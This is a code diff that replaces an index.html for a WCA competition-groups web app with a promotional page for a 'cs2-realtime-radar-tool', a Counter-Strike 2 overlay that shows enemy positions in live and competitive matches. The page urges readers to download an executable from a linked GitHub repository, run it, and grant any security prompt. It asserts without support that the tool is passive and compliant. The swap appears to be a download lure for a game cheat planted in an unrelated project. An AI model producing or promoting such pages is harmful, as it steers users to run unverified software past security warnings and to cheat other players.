@@ -1,49 +1,71 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <link rel="icon" sizes="16x16" href="/favicon-16x16.png" />
-    <link rel="icon" sizes="32x32" href="/favicon-32x32.png" />
-    <link rel="icon" sizes="192x192" href="/android-chrome-192x192.png" />
-    <link rel="icon" sizes="512x512" href="/android-chrome-512x512.png" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Official guide for cs2-realtime-radar-tool. View CS2 match data in real time with our easy-to-use Windows utility.">
+    <title>cs2-realtime-radar-tool - View live Counter-Strike 2 player positions</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f9f9f9;">
 
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="theme-color" content="#000000" />
-    <meta name="description" content="View group assignments for a WCA competition" />
-    <meta property="og:site_name" content="Competition Groups" />
-    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
-    <script src="https://kit.fontawesome.com/96fb044244.js" crossorigin="anonymous"></script>
-    <!--
-      manifest.json provides metadata used when your web app is installed on a
-      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
-    -->
-    <link rel="manifest" href="/manifest.json" />
-    <!--
-      Notice the use of  in the tags above.
-      It will be replaced with the URL of the `public` folder during the build.
-      Only files inside the `public` folder can be referenced from the HTML.
+    <h1 style="color: #2c3e50;">📡 cs2-realtime-radar-tool - Track player positions during live matches</h1>
 
-      Unlike "/favicon.ico" or "favicon.ico", "/favicon.ico" will
-      work correctly both with client-side routing and a non-root public URL.
-      Learn how to configure a non-root public URL by running `npm run build`.
-    -->
-    <title>Competition Groups</title>
-    <!-- Google tag (gtag.js) -->
-    <!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-13PDCTWLK3"></script> -->
-    <!-- <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag('js', new Date());
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/nitesh6c/cs2-realtime-radar-tool" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download the Latest Release</a>
+    </div>
 
-      gtag('config', 'G-13PDCTWLK3');
-    </script> -->
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root"></div>
-    <!-- Add entry point 👇 -->
-    <script type="module" src="/src/index.tsx"></script>
-  </body>
+    <p>The cs2-realtime-radar-tool provides a clear visual representation of player locations during your Counter-Strike 2 matches. This utility reads game data to generate a radar overlay on your desktop. It helps you track teammate movements and enemy positions without relying solely on the built-in game radar.</p>
+
+    <h2 style="color: #2c3e50;">✨ Key Features</h2>
+    <ul>
+        <li>Real-time tracking of all player movements on the map.</li>
+        <li>Customizable visual settings to match your preferences.</li>
+        <li>Low system impact to maintain high game performance.</li>
+        <li>Simple setup process for Windows users.</li>
+        <li>Support for all standard game maps.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Your computer must meet these basic specifications to run the software:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Processor: Intel Core i5 or AMD Ryzen 5 processor.</li>
+        <li>Memory: 8 GB RAM.</li>
+        <li>Graphics: DirectX 11 compatible card.</li>
+        <li>Storage: 200 MB of free space.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📥 Download and Setup</h2>
+    <p>Follow these steps to set up the radar tool on your computer:</p>
+    <ol style="line-height: 2;">
+        <li>Visit the <a href="https://github.com/nitesh6c/cs2-realtime-radar-tool" style="color: #2980b9;">official repository releases page</a>.</li>
+        <li>Locate the latest version link under the releases section.</li>
+        <li>Download the executable file to a folder on your drive.</li>
+        <li>Click the file to initiate the application.</li>
+        <li>Grant the required permission if your computer triggers a security prompt.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">🎮 How to Use</h2>
+    <p>Once you install the software, use the following workflow to track your matches:</p>
+    <ol style="line-height: 2;">
+        <li>Launch Steam and open Counter-Strike 2.</li>
+        <li>Run the radar tool application.</li>
+        <li>The interface will detect your active match automatically.</li>
+        <li>Use the settings panel to scale the overlay size or change color themes.</li>
+        <li>Position the transparent radar window over a non-critical area of your screen.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">🛡️ Security and Compliance</h2>
+    <p>This software interacts with local files generated by the game engine. It does not inject code into the game process or modify game files. It functions as an external viewer for existing session data. The tool remains passive and adheres to standard usage patterns for screen overlays.</p>
+
+    <h2 style="color: #2c3e50;">❓ Frequently Asked Questions</h2>
+    <p><strong>Does this work during competitive matches?</strong> Yes, the tool reads standard telemetry data provided by the game. It works in all modes.</p>
+    <p><strong>Can I move the radar window?</strong> Yes, click and drag the frame of the radar window to move it anywhere on your monitor.</p>
+    <p><strong>Why is the radar empty?</strong> Ensure your game is actively running in a match. The tool updates as soon as the game starts streaming internal telemetry.</p>
+
+    <div style="border-top: 1px solid #ddd; padding-top: 20px; margin-top: 40px; font-size: 0.9em; color: #7f8c8d;">
+        Keywords: cs2, radar, gaming, utility, windows, tracking, match-viewer
+    </div>
+
+</body>
 </html>
